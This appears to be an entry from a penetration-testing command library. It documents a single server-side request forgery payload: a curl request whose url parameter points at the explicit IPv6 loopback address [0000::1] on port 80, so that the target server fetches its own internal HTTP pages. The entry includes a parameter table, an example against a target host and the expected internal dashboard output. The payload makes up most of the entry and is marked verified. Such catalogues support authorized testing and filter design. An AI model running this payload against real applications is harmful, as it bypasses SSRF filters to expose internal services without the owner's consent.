---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:80/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
verified: true
validated: true
---

# access-internal-http-via-ssrf-ipv6-loopback

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[0000::1]:80/"
```

## Description

SSRF payload using explicit IPv6 loopback (0000::1) to access internal HTTP on port 80.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable app URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[0000::1]:80/"
```

## Expected Output

Internal HTTP content, e.g., dashboard HTML.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
